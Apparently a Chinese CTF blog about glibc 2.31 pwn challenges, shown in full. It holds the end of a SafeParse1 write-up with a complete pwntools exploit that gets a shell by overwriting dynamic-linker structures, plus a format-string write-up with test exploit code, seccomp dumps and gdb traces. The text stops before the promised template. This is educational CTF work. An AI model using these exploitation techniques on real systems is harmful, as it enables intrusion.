<p><code>_dl_fixup-&gt;_dl_lookup_symbol_x</code> 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f3b00ea8192</span> &lt;_dl_fixup+<span class="number">210</span>&gt;    call   _dl_lookup_symbol_x                &lt;_dl_lookup_symbol_x&gt;</span><br><span class="line">       rdi: <span class="number">0x7f3b00ec61f1</span> ◂— <span class="number">0xa0006d6574737973</span> <span class="comment">/* &#x27;system&#x27;(free-&gt;system) */</span></span><br><span class="line">       rsi: <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line">       rdx: <span class="number">0x7ffe633dbfa8</span> —▸ <span class="number">0x564f9b547018</span> ◂— <span class="number">0x1200000091</span></span><br><span class="line">       rcx: <span class="number">0x7f3b00ec64f8</span> —▸ <span class="number">0x7f3b00ec6450</span> —▸ <span class="number">0x7f3b00e95590</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— ...</span><br><span class="line">       r8: <span class="number">0x7f3b00e955e0</span> —▸ <span class="number">0x564f9b5480a0</span> ◂— <span class="string">&#x27;GLIBC_2.2.5&#x27;</span></span><br><span class="line">       r9: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">6</span>]: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">7</span>]: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x1620)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x15FA)\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0x101000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x324190</span>-<span class="number">0x10</span></span><br><span class="line">r_debug_offset = <span class="number">0x324160</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset+0x40+5*0x8 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>))</span><br><span class="line">success(<span class="string">&quot;r_debug_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(r_debug_offset))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_2_1_stdout_offset &gt;&gt; 0x2ee690</span></span><br><span class="line"><span class="comment"># link_map_offset &gt;&gt; 0x324180</span></span><br><span class="line"><span class="comment"># link_map_offset+0x40+5*0x8 &gt;&gt; 0x3241e8</span></span><br><span class="line"><span class="comment"># r_debug_offset &gt;&gt; 0x324150 </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;*&gt;***&gt;***&gt;******&gt;**&gt;**&gt;**&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">36</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">38</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">15</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">17</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">38</span>+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="comment">#payload +=&quot;/&lt;//&lt;/&lt;/&lt;/&lt;//////&lt;///&lt;///&lt;/&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Code: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/bin&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00sys&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;tem\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00rea&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;d\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\xa0&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Guess the Number: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<p>这个题我看着就像强网杯的 qwarmup，都是任意写 libc，然后打 <code>_dl_runtime_resolve</code></p>
<p>当时猪脑过载了，就想用 qwarmup 的方法来套这个题，调了半天才发现这个题没有开沙盒，可以直接 get shell（唉）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">print盲打印+格式化漏洞模板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-24 23:07:07 / Modified: 23:11:09" itemprop="dateCreated datePublished" datetime="2022-08-24T23:07:07+08:00">2022-08-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>one 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">8024</span>ac0d4b0ace622bc53363057c78623d729080, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>有沙盒</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s); <span class="comment">/* fmt */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>白给 stack_base</li>
<li>明显的格式化字符串漏洞，但是 <code>close(1)</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, password, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>写满 name 可以泄露 pro_base，绕过 PIE</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们先介绍一个 pwntools 工具：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数表示格式化字符串的偏移</li>
<li>第二个参数表示需要利用 %n 写入的数据，采用字典形式<ul>
<li>将 printf 的 GOT 数据改为 system 函数地址</li>
<li>写法为：<code>&#123;printfGOT:systemAddress&#125;</code> </li>
</ul>
</li>
<li>第三个参数表示已经输出的字符个数</li>
<li>第四个参数表示写入方式<ul>
<li>是按字节（byte-&gt;hhn）双字节（short-&gt;hn）还是四字节（int-&gt;n）</li>
<li>默认值是 byte，即按 hhn 写</li>
</ul>
</li>
<li>fmtstr_payload 函数返回的就是 payload</li>
</ul>
<p>我们断点到 <code>printf</code> 执行处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x562c1b0674b9</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">       vararg: <span class="number">0x7fff2a2d31c0</span> ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span>:<span class="number">0800</span>│     <span class="number">0x7fff2a2d39c0</span> —▸ <span class="number">0x7fff2a2d3ac0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">101</span>:<span class="number">0808</span>│     <span class="number">0x7fff2a2d39c8</span> ◂— <span class="number">0xcf2ec36e5e9ffe00</span></span><br><span class="line"><span class="number">102</span>:<span class="number">0810</span>│ rbp <span class="number">0x7fff2a2d39d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">103</span>:<span class="number">0818</span>│     <span class="number">0x7fff2a2d39d8</span> —▸ <span class="number">0x7f9168f2f083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">104</span>:<span class="number">0820</span>│     <span class="number">0x7fff2a2d39e0</span> —▸ <span class="number">0x7f9169164620</span> (_rtld_global_ro) ◂— <span class="number">0x50f2700000000</span></span><br><span class="line"><span class="number">105</span>:<span class="number">0828</span>│     <span class="number">0x7fff2a2d39e8</span> —▸ <span class="number">0x7fff2a2d3ac8</span> —▸ <span class="number">0x7fff2a2d5317</span> ◂— <span class="number">0x4244006e77702f2e</span> <span class="comment">/* &#x27;./pwn&#x27; */</span></span><br><span class="line"><span class="number">106</span>:<span class="number">0830</span>│     <span class="number">0x7fff2a2d39f0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">107</span>:<span class="number">0838</span>│     <span class="number">0x7fff2a2d39f8</span> —▸ <span class="number">0x562c1b06740b</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>如果这里直接覆盖 <code>__libc_start_main+243</code> 的话，会导致程序的栈帧出问题，并且没有什么用（因为每次覆盖都需要一次 fmt，程序循环后又必须要 fmt 才能继续循环）</li>
<li>于是我们瞄准 <code>printf</code> 的内部进行覆盖</li>
</ul>
<p>在 <code>printf</code> 中，真正执行 “%n” 覆盖的函数是 <code>buffered_vfprintf</code>，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> -&gt; __vfprintf_internal -&gt; buffered_vfprintf</span><br></pre></td></tr></table></figure>
<ul>
<li>如果我们利用 <code>buffered_vfprintf</code> 来覆盖 <code>__vfprintf_internal</code> 的返回地址为 start_addr，就可以在 <code>printf</code> 函数内部实现循环</li>
<li>我们可以利用 <code>printf</code> 间接任意写来覆盖这里</li>
</ul>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">pie=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">success(<span class="string">&quot;pie: &quot;</span>+<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pie+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>)) <span class="comment"># 因为64位程序前6个参数在寄存器中,所以offset设置为&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>GDB 跟踪：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f66e4605d1f</span> &lt;__vfprintf_internal+<span class="number">1215</span>&gt;    call   buffered_vfprintf                &lt;buffered_vfprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x7f66e477c6a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0x7ffe04f611d0</span> ◂— <span class="number">0x3531256330363125</span> (<span class="string">&#x27;%160c%15&#x27;</span>)</span><br><span class="line">       rdx: <span class="number">0x7ffe04f610f0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：（<code>__vfprintf_internal</code> 的返回地址）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│         <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x7f66e45f0d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：（覆盖为 main_addr）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe04f611d0</span><span class="number">-0xe8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffe04f610e8</span> —▸ <span class="number">0x55669931c1a0</span> ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>因为程序会 <code>close(1)</code>，所以不能直接用 <code>printf(%p)</code> 来泄露 libc_base，但是在我们用 main 覆盖 <code>__vfprintf_internal</code> 的返回地址后，其参数 <code>_IO_2_1_stdout_</code> 指针残留在栈上（如果我们直接覆盖 main 的返回地址，就没有这样的效果）</p>
<p>我们可以利用这个指针修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2” 重新获得输出，然后 ORW</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f0e2d3056a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0e2d3056a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad28a7</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f0e2d3056a8</span> (_IO_2_1_stdout_+<span class="number">8</span>) —▸ <span class="number">0x7f0e2d305723</span> (_IO_2_1_stdout_+<span class="number">131</span>) ◂— <span class="number">0x3067e0000000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f0e2d3056e0</span> (_IO_2_1_stdout_+<span class="number">64</span>) —▸ <span class="number">0x7f0e2d305724</span> (_IO_2_1_stdout_+<span class="number">132</span>) ◂— <span class="number">0x2d3067e000000000</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f0e2d3056e8</span> (_IO_2_1_stdout_+<span class="number">72</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f0e2d305708</span> (_IO_2_1_stdout_+<span class="number">104</span>) —▸ <span class="number">0x7f0e2d304980</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7f0e2d305710</span> (_IO_2_1_stdout_+<span class="number">112</span>) ◂— <span class="number">0x1</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7f0e2d305718</span> (_IO_2_1_stdout_+<span class="number">120</span>) ◂— <span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要先把 <code>_IO_2_1_stdout_</code> 修改为 <code>_IO_2_1_stdout_+112</code> 然后再改 <code>fileno</code></li>
<li>注意：<code>_IO_2_1_stdout_+112</code> 的倒数第2字节需要爆破，每次都有 1/16 的概率</li>
</ul>
<p>因为我们只覆盖最后4字节，所以 fmtstr_payload 不能使用，不过我在这里给出一个专门覆盖低4字节的 fmt 模板：</p>
